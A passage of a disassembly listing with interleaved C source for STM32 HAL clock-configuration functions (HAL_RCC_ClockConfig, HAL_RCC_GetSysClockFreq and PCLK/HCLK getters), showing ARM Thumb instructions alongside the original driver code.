 80042e2:	4b6e      	ldr	r3, [pc, #440]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 80042e4:	681b      	ldr	r3, [r3, #0]
 80042e6:	f003 0307 	and.w	r3, r3, #7
 80042ea:	683a      	ldr	r2, [r7, #0]
 80042ec:	429a      	cmp	r2, r3
 80042ee:	d001      	beq.n	80042f4 <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 80042f0:	2301      	movs	r3, #1
 80042f2:	e0cf      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80042f4:	687b      	ldr	r3, [r7, #4]
 80042f6:	681b      	ldr	r3, [r3, #0]
 80042f8:	f003 0302 	and.w	r3, r3, #2
 80042fc:	2b00      	cmp	r3, #0
 80042fe:	d010      	beq.n	8004322 <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004300:	687b      	ldr	r3, [r7, #4]
 8004302:	689a      	ldr	r2, [r3, #8]
 8004304:	4b66      	ldr	r3, [pc, #408]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004306:	689b      	ldr	r3, [r3, #8]
 8004308:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800430c:	429a      	cmp	r2, r3
 800430e:	d908      	bls.n	8004322 <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004310:	4b63      	ldr	r3, [pc, #396]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004312:	689b      	ldr	r3, [r3, #8]
 8004314:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004318:	687b      	ldr	r3, [r7, #4]
 800431a:	689b      	ldr	r3, [r3, #8]
 800431c:	4960      	ldr	r1, [pc, #384]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 800431e:	4313      	orrs	r3, r2
 8004320:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 8004322:	687b      	ldr	r3, [r7, #4]
 8004324:	681b      	ldr	r3, [r3, #0]
 8004326:	f003 0301 	and.w	r3, r3, #1
 800432a:	2b00      	cmp	r3, #0
 800432c:	d04c      	beq.n	80043c8 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 800432e:	687b      	ldr	r3, [r7, #4]
 8004330:	685b      	ldr	r3, [r3, #4]
 8004332:	2b03      	cmp	r3, #3
 8004334:	d107      	bne.n	8004346 <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004336:	4b5a      	ldr	r3, [pc, #360]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004338:	681b      	ldr	r3, [r3, #0]
 800433a:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800433e:	2b00      	cmp	r3, #0
 8004340:	d121      	bne.n	8004386 <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 8004342:	2301      	movs	r3, #1
 8004344:	e0a6      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8004346:	687b      	ldr	r3, [r7, #4]
 8004348:	685b      	ldr	r3, [r3, #4]
 800434a:	2b02      	cmp	r3, #2
 800434c:	d107      	bne.n	800435e <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 800434e:	4b54      	ldr	r3, [pc, #336]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004350:	681b      	ldr	r3, [r3, #0]
 8004352:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004356:	2b00      	cmp	r3, #0
 8004358:	d115      	bne.n	8004386 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800435a:	2301      	movs	r3, #1
 800435c:	e09a      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 800435e:	687b      	ldr	r3, [r7, #4]
 8004360:	685b      	ldr	r3, [r3, #4]
 8004362:	2b00      	cmp	r3, #0
 8004364:	d107      	bne.n	8004376 <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8004366:	4b4e      	ldr	r3, [pc, #312]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004368:	681b      	ldr	r3, [r3, #0]
 800436a:	f003 0302 	and.w	r3, r3, #2
 800436e:	2b00      	cmp	r3, #0
 8004370:	d109      	bne.n	8004386 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004372:	2301      	movs	r3, #1
 8004374:	e08e      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8004376:	4b4a      	ldr	r3, [pc, #296]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004378:	681b      	ldr	r3, [r3, #0]
 800437a:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800437e:	2b00      	cmp	r3, #0
 8004380:	d101      	bne.n	8004386 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004382:	2301      	movs	r3, #1
 8004384:	e086      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 8004386:	4b46      	ldr	r3, [pc, #280]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004388:	689b      	ldr	r3, [r3, #8]
 800438a:	f023 0203 	bic.w	r2, r3, #3
 800438e:	687b      	ldr	r3, [r7, #4]
 8004390:	685b      	ldr	r3, [r3, #4]
 8004392:	4943      	ldr	r1, [pc, #268]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004394:	4313      	orrs	r3, r2
 8004396:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004398:	f7fc fff2 	bl	8001380 <HAL_GetTick>
 800439c:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800439e:	e00a      	b.n	80043b6 <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 80043a0:	f7fc ffee 	bl	8001380 <HAL_GetTick>
 80043a4:	4602      	mov	r2, r0
 80043a6:	68fb      	ldr	r3, [r7, #12]
 80043a8:	1ad3      	subs	r3, r2, r3
 80043aa:	f241 3288 	movw	r2, #5000	; 0x1388
 80043ae:	4293      	cmp	r3, r2
 80043b0:	d901      	bls.n	80043b6 <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 80043b2:	2303      	movs	r3, #3
 80043b4:	e06e      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80043b6:	4b3a      	ldr	r3, [pc, #232]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 80043b8:	689b      	ldr	r3, [r3, #8]
 80043ba:	f003 020c 	and.w	r2, r3, #12
 80043be:	687b      	ldr	r3, [r7, #4]
 80043c0:	685b      	ldr	r3, [r3, #4]
 80043c2:	009b      	lsls	r3, r3, #2
 80043c4:	429a      	cmp	r2, r3
 80043c6:	d1eb      	bne.n	80043a0 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80043c8:	687b      	ldr	r3, [r7, #4]
 80043ca:	681b      	ldr	r3, [r3, #0]
 80043cc:	f003 0302 	and.w	r3, r3, #2
 80043d0:	2b00      	cmp	r3, #0
 80043d2:	d010      	beq.n	80043f6 <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80043d4:	687b      	ldr	r3, [r7, #4]
 80043d6:	689a      	ldr	r2, [r3, #8]
 80043d8:	4b31      	ldr	r3, [pc, #196]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 80043da:	689b      	ldr	r3, [r3, #8]
 80043dc:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 80043e0:	429a      	cmp	r2, r3
 80043e2:	d208      	bcs.n	80043f6 <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 80043e4:	4b2e      	ldr	r3, [pc, #184]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 80043e6:	689b      	ldr	r3, [r3, #8]
 80043e8:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80043ec:	687b      	ldr	r3, [r7, #4]
 80043ee:	689b      	ldr	r3, [r3, #8]
 80043f0:	492b      	ldr	r1, [pc, #172]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 80043f2:	4313      	orrs	r3, r2
 80043f4:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 80043f6:	4b29      	ldr	r3, [pc, #164]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 80043f8:	681b      	ldr	r3, [r3, #0]
 80043fa:	f003 0307 	and.w	r3, r3, #7
 80043fe:	683a      	ldr	r2, [r7, #0]
 8004400:	429a      	cmp	r2, r3
 8004402:	d210      	bcs.n	8004426 <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004404:	4b25      	ldr	r3, [pc, #148]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 8004406:	681b      	ldr	r3, [r3, #0]
 8004408:	f023 0207 	bic.w	r2, r3, #7
 800440c:	4923      	ldr	r1, [pc, #140]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 800440e:	683b      	ldr	r3, [r7, #0]
 8004410:	4313      	orrs	r3, r2
 8004412:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004414:	4b21      	ldr	r3, [pc, #132]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 8004416:	681b      	ldr	r3, [r3, #0]
 8004418:	f003 0307 	and.w	r3, r3, #7
 800441c:	683a      	ldr	r2, [r7, #0]
 800441e:	429a      	cmp	r2, r3
 8004420:	d001      	beq.n	8004426 <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 8004422:	2301      	movs	r3, #1
 8004424:	e036      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 8004426:	687b      	ldr	r3, [r7, #4]
 8004428:	681b      	ldr	r3, [r3, #0]
 800442a:	f003 0304 	and.w	r3, r3, #4
 800442e:	2b00      	cmp	r3, #0
 8004430:	d008      	beq.n	8004444 <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 8004432:	4b1b      	ldr	r3, [pc, #108]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004434:	689b      	ldr	r3, [r3, #8]
 8004436:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 800443a:	687b      	ldr	r3, [r7, #4]
 800443c:	68db      	ldr	r3, [r3, #12]
 800443e:	4918      	ldr	r1, [pc, #96]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004440:	4313      	orrs	r3, r2
 8004442:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 8004444:	687b      	ldr	r3, [r7, #4]
 8004446:	681b      	ldr	r3, [r3, #0]
 8004448:	f003 0308 	and.w	r3, r3, #8
 800444c:	2b00      	cmp	r3, #0
 800444e:	d009      	beq.n	8004464 <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 8004450:	4b13      	ldr	r3, [pc, #76]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004452:	689b      	ldr	r3, [r3, #8]
 8004454:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 8004458:	687b      	ldr	r3, [r7, #4]
 800445a:	691b      	ldr	r3, [r3, #16]
 800445c:	00db      	lsls	r3, r3, #3
 800445e:	4910      	ldr	r1, [pc, #64]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 8004460:	4313      	orrs	r3, r2
 8004462:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8004464:	f000 f824 	bl	80044b0 <HAL_RCC_GetSysClockFreq>
 8004468:	4602      	mov	r2, r0
 800446a:	4b0d      	ldr	r3, [pc, #52]	; (80044a0 <HAL_RCC_ClockConfig+0x1f0>)
 800446c:	689b      	ldr	r3, [r3, #8]
 800446e:	091b      	lsrs	r3, r3, #4
 8004470:	f003 030f 	and.w	r3, r3, #15
 8004474:	490b      	ldr	r1, [pc, #44]	; (80044a4 <HAL_RCC_ClockConfig+0x1f4>)
 8004476:	5ccb      	ldrb	r3, [r1, r3]
 8004478:	f003 031f 	and.w	r3, r3, #31
 800447c:	fa22 f303 	lsr.w	r3, r2, r3
 8004480:	4a09      	ldr	r2, [pc, #36]	; (80044a8 <HAL_RCC_ClockConfig+0x1f8>)
 8004482:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 8004484:	4b09      	ldr	r3, [pc, #36]	; (80044ac <HAL_RCC_ClockConfig+0x1fc>)
 8004486:	681b      	ldr	r3, [r3, #0]
 8004488:	4618      	mov	r0, r3
 800448a:	f7fc ff29 	bl	80012e0 <HAL_InitTick>
 800448e:	4603      	mov	r3, r0
 8004490:	72fb      	strb	r3, [r7, #11]

  return status;
 8004492:	7afb      	ldrb	r3, [r7, #11]
}
 8004494:	4618      	mov	r0, r3
 8004496:	3710      	adds	r7, #16
 8004498:	46bd      	mov	sp, r7
 800449a:	bd80      	pop	{r7, pc}
 800449c:	40022000 	.word	0x40022000
 80044a0:	40021000 	.word	0x40021000
 80044a4:	0800d400 	.word	0x0800d400
 80044a8:	20000000 	.word	0x20000000
 80044ac:	20000004 	.word	0x20000004

080044b0 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 80044b0:	b480      	push	{r7}
 80044b2:	b089      	sub	sp, #36	; 0x24
 80044b4:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 80044b6:	2300      	movs	r3, #0
 80044b8:	61fb      	str	r3, [r7, #28]
 80044ba:	2300      	movs	r3, #0
 80044bc:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80044be:	4b3e      	ldr	r3, [pc, #248]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 80044c0:	689b      	ldr	r3, [r3, #8]
 80044c2:	f003 030c 	and.w	r3, r3, #12
 80044c6:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 80044c8:	4b3b      	ldr	r3, [pc, #236]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 80044ca:	68db      	ldr	r3, [r3, #12]
 80044cc:	f003 0303 	and.w	r3, r3, #3
 80044d0:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80044d2:	693b      	ldr	r3, [r7, #16]
 80044d4:	2b00      	cmp	r3, #0
 80044d6:	d005      	beq.n	80044e4 <HAL_RCC_GetSysClockFreq+0x34>
 80044d8:	693b      	ldr	r3, [r7, #16]
 80044da:	2b0c      	cmp	r3, #12
 80044dc:	d121      	bne.n	8004522 <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 80044de:	68fb      	ldr	r3, [r7, #12]
 80044e0:	2b01      	cmp	r3, #1
 80044e2:	d11e      	bne.n	8004522 <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 80044e4:	4b34      	ldr	r3, [pc, #208]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 80044e6:	681b      	ldr	r3, [r3, #0]
 80044e8:	f003 0308 	and.w	r3, r3, #8
 80044ec:	2b00      	cmp	r3, #0
 80044ee:	d107      	bne.n	8004500 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 80044f0:	4b31      	ldr	r3, [pc, #196]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 80044f2:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 80044f6:	0a1b      	lsrs	r3, r3, #8
 80044f8:	f003 030f 	and.w	r3, r3, #15
 80044fc:	61fb      	str	r3, [r7, #28]
 80044fe:	e005      	b.n	800450c <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004500:	4b2d      	ldr	r3, [pc, #180]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 8004502:	681b      	ldr	r3, [r3, #0]
 8004504:	091b      	lsrs	r3, r3, #4
 8004506:	f003 030f 	and.w	r3, r3, #15
 800450a:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 800450c:	4a2b      	ldr	r2, [pc, #172]	; (80045bc <HAL_RCC_GetSysClockFreq+0x10c>)
 800450e:	69fb      	ldr	r3, [r7, #28]
 8004510:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004514:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004516:	693b      	ldr	r3, [r7, #16]
 8004518:	2b00      	cmp	r3, #0
 800451a:	d10d      	bne.n	8004538 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 800451c:	69fb      	ldr	r3, [r7, #28]
 800451e:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004520:	e00a      	b.n	8004538 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 8004522:	693b      	ldr	r3, [r7, #16]
 8004524:	2b04      	cmp	r3, #4
 8004526:	d102      	bne.n	800452e <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 8004528:	4b25      	ldr	r3, [pc, #148]	; (80045c0 <HAL_RCC_GetSysClockFreq+0x110>)
 800452a:	61bb      	str	r3, [r7, #24]
 800452c:	e004      	b.n	8004538 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 800452e:	693b      	ldr	r3, [r7, #16]
 8004530:	2b08      	cmp	r3, #8
 8004532:	d101      	bne.n	8004538 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 8004534:	4b23      	ldr	r3, [pc, #140]	; (80045c4 <HAL_RCC_GetSysClockFreq+0x114>)
 8004536:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 8004538:	693b      	ldr	r3, [r7, #16]
 800453a:	2b0c      	cmp	r3, #12
 800453c:	d134      	bne.n	80045a8 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 800453e:	4b1e      	ldr	r3, [pc, #120]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 8004540:	68db      	ldr	r3, [r3, #12]
 8004542:	f003 0303 	and.w	r3, r3, #3
 8004546:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 8004548:	68bb      	ldr	r3, [r7, #8]
 800454a:	2b02      	cmp	r3, #2
 800454c:	d003      	beq.n	8004556 <HAL_RCC_GetSysClockFreq+0xa6>
 800454e:	68bb      	ldr	r3, [r7, #8]
 8004550:	2b03      	cmp	r3, #3
 8004552:	d003      	beq.n	800455c <HAL_RCC_GetSysClockFreq+0xac>
 8004554:	e005      	b.n	8004562 <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 8004556:	4b1a      	ldr	r3, [pc, #104]	; (80045c0 <HAL_RCC_GetSysClockFreq+0x110>)
 8004558:	617b      	str	r3, [r7, #20]
      break;
 800455a:	e005      	b.n	8004568 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 800455c:	4b19      	ldr	r3, [pc, #100]	; (80045c4 <HAL_RCC_GetSysClockFreq+0x114>)
 800455e:	617b      	str	r3, [r7, #20]
      break;
 8004560:	e002      	b.n	8004568 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 8004562:	69fb      	ldr	r3, [r7, #28]
 8004564:	617b      	str	r3, [r7, #20]
      break;
 8004566:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 8004568:	4b13      	ldr	r3, [pc, #76]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 800456a:	68db      	ldr	r3, [r3, #12]
 800456c:	091b      	lsrs	r3, r3, #4
 800456e:	f003 0307 	and.w	r3, r3, #7
 8004572:	3301      	adds	r3, #1
 8004574:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 8004576:	4b10      	ldr	r3, [pc, #64]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 8004578:	68db      	ldr	r3, [r3, #12]
 800457a:	0a1b      	lsrs	r3, r3, #8
 800457c:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8004580:	697a      	ldr	r2, [r7, #20]
 8004582:	fb03 f202 	mul.w	r2, r3, r2
 8004586:	687b      	ldr	r3, [r7, #4]
 8004588:	fbb2 f3f3 	udiv	r3, r2, r3
 800458c:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 800458e:	4b0a      	ldr	r3, [pc, #40]	; (80045b8 <HAL_RCC_GetSysClockFreq+0x108>)
 8004590:	68db      	ldr	r3, [r3, #12]
 8004592:	0e5b      	lsrs	r3, r3, #25
 8004594:	f003 0303 	and.w	r3, r3, #3
 8004598:	3301      	adds	r3, #1
 800459a:	005b      	lsls	r3, r3, #1
 800459c:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 800459e:	697a      	ldr	r2, [r7, #20]
 80045a0:	683b      	ldr	r3, [r7, #0]
 80045a2:	fbb2 f3f3 	udiv	r3, r2, r3
 80045a6:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 80045a8:	69bb      	ldr	r3, [r7, #24]
}
 80045aa:	4618      	mov	r0, r3
 80045ac:	3724      	adds	r7, #36	; 0x24
 80045ae:	46bd      	mov	sp, r7
 80045b0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80045b4:	4770      	bx	lr
 80045b6:	bf00      	nop
 80045b8:	40021000 	.word	0x40021000
 80045bc:	0800d418 	.word	0x0800d418
 80045c0:	00f42400 	.word	0x00f42400
 80045c4:	007a1200 	.word	0x007a1200

080045c8 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 80045c8:	b480      	push	{r7}
 80045ca:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 80045cc:	4b03      	ldr	r3, [pc, #12]	; (80045dc <HAL_RCC_GetHCLKFreq+0x14>)
 80045ce:	681b      	ldr	r3, [r3, #0]
}
 80045d0:	4618      	mov	r0, r3
 80045d2:	46bd      	mov	sp, r7
 80045d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80045d8:	4770      	bx	lr
 80045da:	bf00      	nop
 80045dc:	20000000 	.word	0x20000000

080045e0 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 80045e0:	b580      	push	{r7, lr}
 80045e2:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 80045e4:	f7ff fff0 	bl	80045c8 <HAL_RCC_GetHCLKFreq>
 80045e8:	4602      	mov	r2, r0
 80045ea:	4b06      	ldr	r3, [pc, #24]	; (8004604 <HAL_RCC_GetPCLK1Freq+0x24>)
 80045ec:	689b      	ldr	r3, [r3, #8]
 80045ee:	0a1b      	lsrs	r3, r3, #8
 80045f0:	f003 0307 	and.w	r3, r3, #7
 80045f4:	4904      	ldr	r1, [pc, #16]	; (8004608 <HAL_RCC_GetPCLK1Freq+0x28>)
 80045f6:	5ccb      	ldrb	r3, [r1, r3]
 80045f8:	f003 031f 	and.w	r3, r3, #31
 80045fc:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004600:	4618      	mov	r0, r3
 8004602:	bd80      	pop	{r7, pc}
 8004604:	40021000 	.word	0x40021000
 8004608:	0800d410 	.word	0x0800d410

0800460c <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 800460c:	b580      	push	{r7, lr}
 800460e:	af00      	add	r7, sp, #0
